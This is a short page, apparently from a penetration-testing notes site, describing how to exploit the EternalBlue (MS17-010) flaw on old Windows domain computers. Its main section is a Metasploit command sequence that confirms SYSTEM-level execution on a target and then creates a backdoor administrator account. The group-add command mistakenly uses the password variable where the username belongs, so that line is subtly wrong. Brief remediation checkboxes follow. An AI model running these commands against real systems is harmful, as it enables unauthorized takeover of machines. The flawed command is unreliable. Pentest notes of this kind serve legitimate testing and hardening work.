---
layout: default
title: EternalBlue [MS17-010]
parent: Windows
nav_order: 4
permalink: /windows/eternalblue/
---

# EternalBlue [MS17-010]
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Prerequisites

- Windows XP or 2003 domain computer.

## Exploit

```bash
# Start metasploit.
msfconsole

# Look for eternalblue exploit.
search eternalblue

# Take (auxiliary/admin/smb/ms17_010_command).
use 2

# Setup the exploit to check exploitability (should return local\SYSTEM).
set COMMAND whoami
set RHOSTS $IP
run

# To gain administrative access.
set COMMAND net user $USERNAME $PASSWORD /add;net localgroup Administrators $PASSWORD /add
run
```

## Recommendations

- [ ]  Update Windows computers to a supported version by Microsoft.
- [ ]  Remove vulnerable Windows computers from the domain to put them in WORKGROUP.
- [ ]  Isolate vulnerable Windows computers in a dedicated sub-network and restrict its access.